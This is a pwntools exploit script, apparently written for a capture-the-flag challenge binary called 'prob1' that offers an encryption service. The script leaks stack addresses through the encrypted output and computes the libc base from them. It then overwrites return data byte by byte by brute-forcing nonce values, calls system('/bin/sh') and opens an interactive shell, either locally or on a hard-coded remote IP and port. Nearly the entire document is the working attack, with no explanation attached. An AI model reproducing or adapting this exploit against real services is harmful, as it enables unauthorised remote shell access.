from pwn import *
from sys import *


context.arch = "i386"
context.terminal = ["tmux", "sp", "-h"]

elf = ELF("./prob1")
script = '''
c
'''

def set_key(key):
    r.sendlineafter(">>>", "1")
    r.sendafter("Enter key:", key)
    key

def encrypt(message):
    r.sendlineafter(">>>", "2")
    r.sendafter("Enter message to encrypt:", message)

def attach_gdb():
    gdb.attach(r)
    r.interactive()

def overwrite(pos, target):
    x = 0
    setFlag = True
    while True:
        if setFlag:
            setFlag = False
	    info("set_key")
            set_key("A" * (0x20 + pos - x) + "\x00")
            #set_key("A" * (0x18 + pos - x) + "\x00")
        encrypt("A" * 0x100) 
	r.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
	enc = r.recvuntil("\n-")
        enc = (enc[:4]) 
        nonce = u32(enc) ^ 0x41414141
        #print hex(nonce)
        if (target >> (8 * (3 - x))) & 0xff == nonce >> 24:
            print(hex(target), hex(nonce >> 8),hex(pos))
            setFlag = True
            x += 1
            if x == 4:
                break

if len(argv) == 1 :
    info("erro")
    info("usage python ex1.py [l] or [r]")
    info(" l = local ")
    info(" r = remote ")
    exit()

if argv[1] == 'l':
    info("local exploit")
    r = process("./prob1")
    libc = ELF("./libc6_2.27-3ubuntu1_i386.so")
elif argv[1] == 'r' :
    info("remote exploit")
    libc = ELF("./libc6-amd64_2.19-10ubuntu2_i386.so")
    r = remote("143.248.249.153", 4014)
else :
    info("argc = l or r")
    exit()

set_key("A"*264)
encrypt("B"*256)

print r.recvuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
data = r.recvuntil("\n-")
leaked_addrs = []
for i in range(0, len(data), 4):
    if i == 528 :
        break;
    leaked_addrs.append(u32(data[i:i+4]))
info("print")

#for i in range(len(leaked_addrs)):
#    print "{} = {}".format(i,hex(leaked_addrs[i]))
#attach_gdb()
#r.interactive()
#exit()
libc_start_main = leaked_addrs[69]-241
elf_start_main = leaked_addrs[99]
log.info("libc_start_main  address : %#x" % libc_start_main)
libc_base  = libc_start_main - libc.symbols["__libc_start_main"]
log.info("libc base address : %#x" % libc_base)

log.info("elf_start_main address : %#x" % elf_start_main)

binsh = libc_base + list(libc.search('/bin/sh'))[0] 
system_addr = libc_base + libc.symbols["system"]
log.info("binsh address : %#x" % binsh)
log.info("system address : %#x" % system_addr)

info("overwirte")
overwrite(0x08,binsh)
overwrite(0x04,elf_start_main)
overwrite(0x00,system_addr)
#attach_gdb()
#r.interactive()
info("send 3")
r.sendline("3")
info("interactive")
r.interactive()
